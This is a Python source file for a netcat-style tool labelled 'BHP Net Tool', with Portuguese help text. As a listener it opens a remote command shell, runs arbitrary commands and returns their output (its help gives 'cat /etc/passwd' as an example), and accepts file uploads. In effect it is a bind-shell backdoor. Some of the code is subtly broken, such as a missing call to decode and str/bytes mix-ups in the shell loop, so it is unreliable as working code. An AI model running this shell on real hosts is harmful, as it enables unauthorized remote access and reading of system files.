import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

F='\033[m'
B='\033[1m'
WHITE='\033[38;2;255;255;255m'
PINK='\033[38;2;255;0;255m'
YELLOW='\033[38;2;255;255;0m'
AZUL1='\033[38;2;0;255;255m'
RED='\033[38;2;255;0;0m'
GREEN='\033[38;2;0;255;0m'
AZUL2='\033[38;2;0;0;255m'
RED_T='\033[48;2;255;0;0m'

def logo(): #CrypR
# In non HEX Format 
    print()
    print(f"  {B}{GREEN} ooooo      ooo               .   {RED}  .oooooo.  {B}{GREEN}               .   {F}")
    print(f"  {B}{GREEN} `888b.     `8'             .o8   {RED} d8P'  `Y8b {B}{GREEN}             .o8   {F}")
    print(f"  {B}{GREEN}  8 `88b.    8   .ooooo.  .o888oo {RED}888         {B}{GREEN}  .oooo.   .o888oo {F}")
    print(f"  {B}{GREEN}  8   `88b.  8  d88' `88b   888   {RED}888         {B}{GREEN} `P  )88b    888   {F}")
    print(f"  {B}{GREEN}  8     `88b.8  888ooo888   888   {RED}888         {B}{GREEN}  .oP'888    888   {F}")
    print(f"  {B}{GREEN}  8       `888  888    .o   888 . {RED}`88b    ooo {B}{GREEN} d8(  888    888 . {F}")
    print(f"  {B}{GREEN} o8o        `8  `Y8bod8P'   '888' {RED} `Y8bood8P' {B}{GREEN}`Y888''8o   '888'  {F}")
    print()
    print(f" {GREEN}<======================{B}{RED_T} Created by Ascoid {F}{GREEN}=======================> {F}")
    print()
    print(f"{B}{RED}[+]{GREEN} Servidor NetCat INICIADO!{F}")
    print()

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(
        shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('>  ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User terminated.")
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = ''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    logo()
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example: 
            Sub_Netcat.py -t 192.168.1.108 -p 5555 -l -c # Command Shell
            Sub_Netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # Carregar Arquivo
            Sub_Netcat.py  -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # Executar Comando
            echo 'ABC' | ./Sub_Netcat.py -t 192.168.1.108 -p 135 #  Echo Texto do Servidor Port 135
            Sub_Netcat.py  -t 192.168.1.108 -p 5555 # Conecte-se ao Servidor
        '''))
    parser.add_argument('-c', '--command', action='store_true',help='Comando Shell')
    parser.add_argument('-e', '--execute', help='Executar o Comando Especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='Ouvir')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta Especificada')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='IP especificado')
    parser.add_argument('-u', '--upload', help='Subir Arquivo')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()